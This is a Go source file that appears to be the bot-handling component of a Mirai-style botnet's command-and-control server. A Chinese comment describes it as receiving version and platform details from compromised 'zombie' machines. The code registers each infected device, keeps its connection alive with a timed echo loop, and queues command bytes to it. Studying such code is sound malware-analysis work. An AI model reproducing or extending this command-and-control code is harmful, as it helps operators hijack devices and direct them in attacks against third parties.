package main

import (
    "net"
    "time"
)

type Bot struct {
    uid     int
    conn    net.Conn
    version byte
    source  string
}

// NewBot位于bot.go中，用于接收肉鸡上传上来的版本信息、平台类型。
func NewBot(conn net.Conn, version byte, source string) *Bot {
    return &Bot{-1, conn, version, source}
}

func (this *Bot) Handle() {
    clientList.AddClient(this)
    defer clientList.DelClient(this)

    buf := make([]byte, 2)
    for {
        this.conn.SetDeadline(time.Now().Add(180 * time.Second))
        if n,err := this.conn.Read(buf); err != nil || n != len(buf) {
            return
        }
        if n,err := this.conn.Write(buf); err != nil || n != len(buf) {
            return
        }
    }
}

func (this *Bot) QueueBuf(buf []byte) {
    this.conn.Write(buf)
}
